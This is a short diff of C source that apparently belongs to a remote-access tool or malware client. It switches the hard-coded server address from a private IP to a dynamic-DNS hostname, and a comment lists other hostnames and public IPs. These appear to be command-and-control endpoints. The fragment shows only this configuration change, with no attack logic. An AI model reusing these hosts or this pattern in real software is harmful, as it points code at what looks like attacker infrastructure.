@@ -79,7 +79,7 @@ DWORD dwMemPageSize = 0;
 char cCryptKey[32] = { 0 };
 
 //googfun888.servequake.com
-char SERVER_IP_ADDRESS[64] = "192.168.101.122";			//zozotown2304.ufcfan.org  45.207.44.139	192.168.101.122		47.101.204.4
+char SERVER_IP_ADDRESS[256] = "googfun888.servequake.com";			//zozotown2304.ufcfan.org  45.207.44.139	192.168.101.122		47.101.204.4
 char gUserName[64] = "test";
 DWORD gServerIP = 0;
 
